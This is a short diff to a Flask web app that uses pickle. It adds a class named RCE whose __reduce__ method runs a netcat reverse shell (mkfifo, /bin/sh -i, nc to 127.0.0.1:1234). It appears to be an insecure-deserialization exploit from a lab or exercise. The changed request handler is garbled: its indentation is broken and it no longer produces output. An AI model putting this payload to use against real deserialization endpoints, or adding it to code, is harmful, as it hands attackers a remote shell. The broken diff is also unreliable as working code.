@@ -5,6 +5,11 @@ import pickle
 
 app = Flask(__name__)
 
+class RCE:
+    def __reduce__(self):
+        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
+               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
+        return os.system, (cmd,)
 
 @app.route('/')
 def my_form():
@@ -14,8 +19,10 @@ def my_form():
 @app.route('/', methods=['POST'])
 def my_form_post():
     try:
-        data = base64.urlsafe_b64decode(request.form['text'])
-        output = pickle.loads(data)
+        
+    pickled = pickle.dumps(RCE())
+    
+    
     except Exception as e:
         output = e
     return render_template('home.html', code=output)
